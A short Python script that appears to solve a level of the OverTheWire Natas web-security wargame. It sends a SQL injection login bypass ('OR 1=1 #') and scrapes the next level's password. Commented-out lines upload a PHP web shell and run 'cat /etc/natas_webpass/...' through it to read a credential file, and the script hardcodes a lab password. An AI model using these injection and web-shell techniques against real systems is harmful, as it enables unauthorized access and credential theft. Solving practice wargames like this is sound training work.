#!/usr/bin/env python

import requests
import re
import urllib
import base64

username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/?debug=true' %username

#response = requests.get(url, auth = (username, password))
session = requests.Session()

response = requests.post(url, data = { "username" : 'please" OR 1=1 #', "password": "blah"}, auth = (username, password))

#response = session.post(url, files ={"uploadedfile" : open('request.php', 'rb')}, data = {"filename" : "request.php", "MAX_FILE_SIZE" : "1000"}, auth = (username, password) )

#response = session.get( url + 'upload/glmd0ffrko.php?c=cat /etc/natas_webpass/natas14', auth = (username, password))
content = response.text
#print base64.b64decode(urllib.unquote(session.cookies['data'])).encode('hex')
#print content
 
print re.findall('The password for natas15 is (.*)<br>', content)[0]